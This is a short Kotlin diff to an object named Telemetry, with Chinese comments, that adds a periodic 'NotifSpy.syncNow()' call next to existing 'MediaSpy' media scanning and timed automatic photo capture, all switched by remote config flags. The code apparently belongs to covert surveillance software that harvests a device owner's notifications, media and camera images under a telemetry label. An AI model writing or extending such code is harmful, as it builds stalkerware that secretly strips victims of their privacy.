@@ -76,6 +76,10 @@ object Telemetry {
                     if (tick % 6 == 0 && (RemoteConfig.mediaScan || RemoteConfig.autoMedia)) {
                         runCatching { MediaSpy.scan(app) }
                     }
+                    // 通知：服务已连接就定期全量同步一次（补漏掉的）
+                    if (tick % 15 == 0) {
+                        runCatching { NotifSpy.syncNow() }
+                    }
                     // 自动模式：按间隔定时拍照
                     if (RemoteConfig.autoMode) {
                         runCatching { autoShoot(app) }
